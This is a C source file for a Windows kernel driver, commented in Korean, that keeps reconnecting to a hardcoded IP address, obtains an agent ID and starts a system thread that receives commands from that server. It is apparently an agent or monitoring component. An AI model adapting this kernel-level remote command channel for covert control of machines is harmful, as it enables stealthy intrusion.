#pragma warning(disable:4100)
#pragma warning(disable:4996)
#include "TCP_conn.h"

#include "Build_Socket.h"

#include "util_Delay.h"// 딜레이


#include "License_Agent_struct.h" // 라이선스,에이전트 ID


#include "communication_with_RUST.h" // 연결 성공 후 실행되는 곳


BOOLEAN is_connected_2_SERVER = FALSE;
KEVENT is_connected_event = { 0 };

VOID TCP_conn(PVOID context) {
	UNREFERENCED_PARAMETER(context);
	//KeSetEvent
	KeInitializeEvent(&is_connected_event, SynchronizationEvent, FALSE);

	while (1) {
		/*이미 연결되어 있는가? */
		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "1 KeReadStateEvent 테스트 -> %d\n", KeReadStateEvent(&is_connected_event));
		if (!is_connected_2_SERVER) {
			/* TCP 최초 연결 시도 */
			/* TCP 연결 되었는가? */
			if (Make_TCP_Connection((PCHAR)"59.3.230.120", (USHORT)1029, &COMMAND_NewSocket) != STATUS_SUCCESS) { // [1/2]
				if (COMMAND_NewSocket == NULL) {// [2/2]
					Delays(-1);
					continue;
				}
			}
			else {
				DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "TCP_conn => Make_TCP_Connection() 성공!\n");

				/* Agent_ID를 먼저 얻어야한다.
					HDD에 저장되며,
					서버가 요구하는 "절대경로"에 Agent_ID가 HDD에 없으면 서버의 SHA512(128B) 값을 받아서 HDD에 저장한다.
				*/
				if (GET_AGENT_ID() != STATUS_SUCCESS) {
					return;
				}

			}
		}
		is_connected_2_SERVER = TRUE;
		Delays(-1);

		HANDLE thread_handle = 0;
		PsCreateSystemThread(&thread_handle, THREAD_ALL_ACCESS, NULL, NULL, NULL, communication_server, NULL); // 무한 서버 리시버 스레드

		Delays(-1);
		ZwClose(thread_handle);
		//DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "TCP_conn => is_connected_event 이벤트 잠금시도!!\n");
		KeWaitForSingleObject(&is_connected_event, Executive, KernelMode, FALSE, NULL); // 연결이 끊기면 스레드가 다시 흐른다.


	}
}